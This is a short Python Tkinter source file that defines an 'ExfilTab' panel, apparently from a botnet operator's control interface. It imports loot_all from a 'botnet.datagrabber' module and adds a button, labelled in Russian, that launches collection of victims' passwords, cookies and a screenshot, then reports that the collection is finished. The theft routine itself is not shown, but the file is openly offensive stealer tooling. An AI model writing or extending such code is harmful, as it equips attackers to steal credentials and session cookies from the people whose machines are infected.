import tkinter as tk
from tkinter import messagebox
from botnet.datagrabber import loot_all

class ExfilTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        tk.Button(self, text="Запустить сбор данных (пароли/куки/скриншот)", command=self.start_exfil).pack(pady=20)

    def start_exfil(self):
        loot_all()
        messagebox.showinfo("Exfil", "Сбор данных завершён")
